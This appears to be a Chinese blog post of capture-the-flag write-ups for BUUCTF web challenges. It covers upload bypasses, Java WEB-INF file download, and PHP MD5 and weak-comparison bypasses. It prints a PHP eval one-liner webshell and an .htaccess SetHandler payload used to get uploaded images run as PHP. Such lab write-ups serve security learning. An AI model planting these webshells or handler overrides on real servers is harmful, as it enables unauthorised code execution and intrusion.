---
title: BUUCTF_Web
abbrlink: 282276cb
date: 2021-03-15 22:17:21
tags:
categories:
---

# [MRCTF2020]你传你🐎呢

## 解题思路

首先，先上传一句话木马文件

```php
<?php
    @eval($_POST['123']);
?>
```

<!-- more -->之后，使用burpsuite更改MIME类型和后缀名，网页显示返回路径，但是这时候用蚁剑并不能连接成功，这是因为上传的是jpg文件无法解析成php，所以这时候，我们要先上传.htaccess文件（可以将其他文件类型当做php解析）。

然后，新建名字为”.htaccess“的文件，内容：

```
SetHandler application/x-httpd-php
```

通过BurpSuite修改content-type类型后，也上传成功

然后通过蚁剑访问链接：

```
http://5b54f248-571b-4dac-95ea-fe0831a863de.node3.buuoj.cn/upload/06efab0e29ec5f55e0e5e3d3c7e5a424/pass.jpg
```

## 知识点补充

### .htaccess文件

> .htaccess文件是什么         [原文传送门](https://www.cnblogs.com/adforce/archive/2012/11/23/2784664.html)
>
> 　　.htaccess文件(或者"分布式配置文件"）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。
>
> 　　概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。
>
> 　　启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。
>
> 　　笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。
> 

# [RoarCTF 2019]Easy Java

## 解题思路

首先，查看网站源码

![6s9MsH.jpg](https://s3.ax1x.com/2021/03/16/6s9MsH.jpg)

这个链接点击之后，发现

![6s9nzD.jpg](https://s3.ax1x.com/2021/03/16/6s9nzD.jpg)这时候我们看url链接

![6s9eJK.jpg](https://s3.ax1x.com/2021/03/16/6s9eJK.jpg)

我们推测是任意文件下载漏洞，我们知道GET和POST请求方式是有区别的，其中有一点就是GET传送数据量较小，收到URL长度限制，POST传送数据较大不受限制，所以我们使用BurpSuite拦截一下

![6s9KQe.jpg](https://s3.ax1x.com/2021/03/16/6s9KQe.jpg)

将GET改成POST然后在点击Forward，之后显示下载链接

![6s9mRO.jpg](https://s3.ax1x.com/2021/03/16/6s9mRO.jpg)

这个打开一看并不是我们想要的

## 知识补充

**javaweb项目开发的结构目录**

```
WEB项目主要包含一下文件或目录:
　　/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
　　/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
　　/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
　　/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
　　/WEB-INF/database.properties：数据库配置文件
漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，通过反编译class文件，得到网站源码
```

使用BurpSuite更改内容

![6s93dI.jpg](https://s3.ax1x.com/2021/03/16/6s93dI.jpg)

将文件下载之后

![6s98ot.jpg](https://s3.ax1x.com/2021/03/16/6s98ot.jpg)

知道了这个以后，我们可以使用BurpSuite进行更改，下载class源文件

![6s9QLd.jpg](https://s3.ax1x.com/2021/03/16/6s9QLd.jpg)

反编译的BASE64解密的到flag

# [MRCTF2020]Ez_bypass

　　打开靶机，我们根据提示，按住F12可以得到

```php
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                if($passwd==1234567)
                {
                    echo 'Good Job!';
                    highlight_file('flag.php');
                    die('By Retr_0');
                }
                else
                {
                    echo "can you think twice??";
                }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
    }
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
}
```

## 知识补充

**isset()** 函数用于检测变量是否已设置并且非 NULL

如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。

若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。

同时要注意的是 null 字符（"\0"）并不等同于 PHP 的 NULL 常量。

**md5加密**，但是md5()函数无法操作数组，可以进行数组绕过。

![6ys11J.jpg](https://s3.ax1x.com/2021/03/16/6ys11J.jpg)

**is_numeric()** 函数用于检测变量是否为数字或数字字符串。是则为true，我们可以使用1234567a绕过，1234567a是字符串，但是在弱比较的时候，1在前面，php会将其整体转成数字。[原文链接](https://www.cnblogs.com/Mrsm1th/p/6745532.html)

所以完整的语句：

![6ys8XR.jpg](https://s3.ax1x.com/2021/03/16/6ys8XR.jpg)

可以拿到flag

![6yslp4.jpg](https://s3.ax1x.com/2021/03/16/6yslp4.jpg)

# [GXYCTF2019]BabyUpload

## 解题思路

我们先通过修改MIME类型上传一句话木马试试

![6ys3c9.jpg](https://s3.ax1x.com/2021/03/16/6ys3c9.jpg)

上传成功，但是这个时候我们还不能使用蚁剑连接成功，因为上传文件的后缀名是jpg，并不会把文件当做php文件执行，所以我们还用上一题的方法上传.htaccess文件，之后使用蚁剑连接，就在根目录下得到了flag

![6ysMhF.jpg](https://s3.ax1x.com/2021/03/16/6ysMhF.jpg)

![6yynKA.jpg](https://s3.ax1x.com/2021/03/16/6yynKA.jpg)

# [网鼎杯 2018]Fakebook

